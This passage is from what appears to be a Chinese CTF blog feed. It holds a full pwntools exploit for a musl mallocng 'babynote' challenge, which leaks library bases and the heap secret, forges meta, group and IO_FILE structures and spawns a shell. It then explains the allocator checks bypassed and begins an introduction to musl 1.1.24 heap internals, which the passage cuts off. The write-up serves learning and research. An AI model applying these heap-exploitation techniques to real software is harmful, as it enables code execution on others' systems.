class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;babynote&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babynote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size, name, note_size, note</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;note size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(note_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;note content: &#x27;</span>)</span><br><span class="line">    r.send(note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">name_size, name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">name_size, name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forget</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;d&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">forget()</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x58</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x58</span>)</span><br><span class="line">find(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x28:&#x27;</span>)</span><br><span class="line">elf_base = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">libc_base = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    elf_base = r.recv(<span class="number">2</span>) + elf_base</span><br><span class="line">r.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    libc_base = r.recv(<span class="number">2</span>) + libc_base</span><br><span class="line">elf_base = <span class="built_in">int</span>(elf_base, base=<span class="number">16</span>) - <span class="number">0x4dc0</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_base, base=<span class="number">16</span>) - <span class="number">0xb7870</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">__malloc_context = libc_base + <span class="number">0xb4ac0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">payload = flat(elf_base + <span class="number">0x4cc0</span>, __malloc_context, <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="number">0</span>)</span><br><span class="line">find(<span class="number">0x28</span>, payload)</span><br><span class="line">find(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x28:&#x27;</span>)</span><br><span class="line">secret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    secret = r.recv(<span class="number">2</span>) + secret</span><br><span class="line">secret = <span class="built_in">int</span>(secret, base=<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line">__stdout_used = libc_base + <span class="number">0xb43b0</span></span><br><span class="line">heap_addr = libc_base - <span class="number">0x7000</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_area_addr = heap_addr + <span class="number">0x1000</span></span><br><span class="line">fake_meta_addr = fake_area_addr + <span class="number">0x10</span></span><br><span class="line">fake_group_addr = fake_meta_addr + <span class="number">0x30</span></span><br><span class="line">fake_IO_FILE_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area = flat(secret, <span class="number">0</span>)</span><br><span class="line">fake_meta = flat(fake_IO_FILE_addr, __stdout_used, fake_group_addr, (<span class="number">1</span> &lt;&lt; <span class="number">1</span>),</span><br><span class="line">                 (<span class="number">20</span> &lt;&lt; <span class="number">6</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) | <span class="number">1</span> | (<span class="number">0xfff</span> &lt;&lt; <span class="number">12</span>))</span><br><span class="line">fake_meta = fake_meta.ljust(<span class="number">0x30</span>)</span><br><span class="line">fake_group = flat(fake_meta_addr, <span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + <span class="string">b&#x27;X&#x27;</span> * <span class="number">8</span> + p64(</span><br><span class="line">    <span class="number">0xbeefdead</span>) + p64(system) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x500</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (</span><br><span class="line">    <span class="number">0x1000</span> - <span class="number">0x20</span>) + fake_meta_area + fake_meta + fake_group + fake_IO_FILE</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&quot;z&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;e&#x27;</span> * <span class="number">0x38</span>, <span class="number">0x2000</span>, payload)</span><br><span class="line"></span><br><span class="line">fake_name_addr = elf_base + <span class="number">0x4d80</span></span><br><span class="line">fake_note = flat(fake_name_addr, fake_IO_FILE_addr, <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">0</span>)</span><br><span class="line">fake_note_addr = libc_base + <span class="number">0xb7d50</span></span><br><span class="line">create(<span class="number">0x4</span>, <span class="string">b&#x27;f&#x27;</span> * <span class="number">0x4</span>, <span class="number">0x28</span>, fake_note)</span><br><span class="line">create(<span class="number">0x4</span>, <span class="string">b&#x27;g&#x27;</span> * <span class="number">0x4</span>, <span class="number">0x38</span>, <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">find(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">payload = flat(elf_base + <span class="number">0x4cc0</span>, __malloc_context, <span class="number">0x38</span>, <span class="number">0x28</span>, fake_note_addr)</span><br><span class="line">find(<span class="number">0x28</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0x38</span>, <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;option: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(</span></span><br><span class="line"><span class="comment">#     r,</span></span><br><span class="line"><span class="comment">#     &#x27;dir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc\ndir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc/mallocng\nb free&#x27;</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="构造meta"><a href="#构造meta" class="headerlink" title="构造meta"></a>构造meta</h3><p>这里再继续花上一点篇幅讲解一下怎么构造meta，其实看别人博客也把我看晕了，自己对照源码然后调试发现并不难，所以我的exp也就整体进行了缩减。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们如果想要进入dequeue需要进入if判断，并且内部还有个assert，我们需要绕过这两项。</p><p>再关注一下meta结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line"><span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line"><span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line"><span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先看if判断的第一个内容，我们先看一下在exp当中构造的meta的最后是什么形式表现的</p><p><img src="/images/image-20220510154833852.png" alt="image-20220510154833852"></p><p>可以看到这里的avail_mask和freed_mask的或值是2等号左半边的值即为3，再看last_idx那么有半边也为3了，就轻松绕过了。再看后面的那个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">okay_to_free</span><span class="params">(struct meta *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// always free individual mmaps not suitable for reuse</span></span><br><span class="line"><span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT*size_classes[sc])</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// always free groups allocated inside another group&#x27;s slot</span></span><br><span class="line"><span class="comment">// since recreating them should not be expensive and they</span></span><br><span class="line"><span class="comment">// might be blocking freeing of a much larger group.</span></span><br><span class="line"><span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if there is another non-full group, free this one to</span></span><br><span class="line"><span class="comment">// consolidate future allocations, reduce fragmentation.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free any group in a size class that&#x27;s not bouncing</span></span><br><span class="line"><span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> cnt = g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"></span><br><span class="line"><span class="comment">// if usage is high enough that a larger count should be</span></span><br><span class="line"><span class="comment">// used, free the low-count group so a new one will be made.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">9</span>*cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// otherwise, keep the last group in a bouncing class.</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要返回的结果不为0即可，所以对照上面的图片即可看到很轻松也是可以绕过的，最后则是里面的assert的不大于48，也是很简单就绕过了。但是在实验期间发现了一个新的检测，我把maplen删掉了之后出现了崩溃的情况，查看源码发现，maplen =0 表示group 不是新mmap 出来的在size_classes里，meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">free_group</span><span class="params">(struct meta *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">step_seq();</span><br><span class="line">record_seq(sc);</span><br><span class="line">mi.base = g-&gt;mem;</span><br><span class="line">mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">void</span> *p = g-&gt;mem;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line"><span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">mi = nontrivial_free(m, idx);</span><br><span class="line">&#125;</span><br><span class="line">free_meta(g);</span><br><span class="line"><span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码这里也验证了，如果置为0就会进一步进行free，在get_meta就可会出现崩溃。其实在get_meta函数内存在很多assert都可以看一下，这里就不过多赘述了。</p><hr><p>参考链接：</p><p><a class="link"   href="https://xz.aliyun.com/t/10326" >https://xz.aliyun.com/t/10326<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://eqqie.cn/" >https://eqqie.cn/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h2&gt;&lt;h3 id=&quot;数据结构&quot;&gt;&lt;a href=&quot;#数据结构&quot; class=&quot;headerlink&quot; title=&quot;数据结构&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="musl" scheme="https://cv196082.gitee.io/tags/musl/"/>
    
  </entry>
  
  <entry>
    <title>musl 1.1.24利用方式</title>
    <link href="https://cv196082.gitee.io/2022/04/27/musl-1-1-24%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
    <id>https://cv196082.gitee.io/2022/04/27/musl-1-1-24%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</id>
    <published>2022-04-27T12:35:56.000Z</published>
    <updated>2022-05-09T06:33:11.745Z</updated>
    
    <content type="html"><![CDATA[<p>这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！</p><p>在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈github的仓库当中并没有题目的源码所以没去深入了解，在starCTF过后也算是了解一下这一相较于glic更为轻量的libc了。</p><p>首先本文先介绍一下这一libc</p><h2 id="musl-1-1-24"><a href="#musl-1-1-24" class="headerlink" title="musl 1.1.24"></a>musl 1.1.24</h2><p>musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 Alpine Linux（做过 Docker 镜像的应该很熟悉）、OpenWrt（常用于路由器）和 Gentoo 等。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>这一版本的chunk结构其实是和glibc相差不大的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>psize和csize字段都有标志位（glibc 只有size字段有），但只有一种位于最低位的标志位INUSE（glibc 最低三位都有标志位）。若设置INUSE标志位（最低位为1），表示 chunk 正在被使用；若没有设置INUSE标志位（最低位为0），表示 chunk 已经被释放或者通过mmap分配的，需要通过psize的标志位来进一步判断 chunk 的状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure><p>这个mal结构体很类似main_arena，里面记录着堆的信息，有三个成员：64位无符号整数binmap、链表头部数组bins和锁free_lock。binmap记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>bin 链表头部的结构如上。head和tail指针分别指向首部和尾部的 chunk，同时首部 chunk 的prev指针和尾部 chunk 的next指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，head和tail指针等于 0 或者指向链表头部自身。</p><p>看mal结构可以看到有64的bin，前面32个bin是类似于small bin的结构，存放的chunk的大小是固定的，但是后面的就类似于large bin存放的是在一定范围的chunk了。</p><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/malloc/malloc.c L284-L331</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. n 增加头部长度 OVERHEAD (0x10)，对齐 32 位：</span></span><br><span class="line">    <span 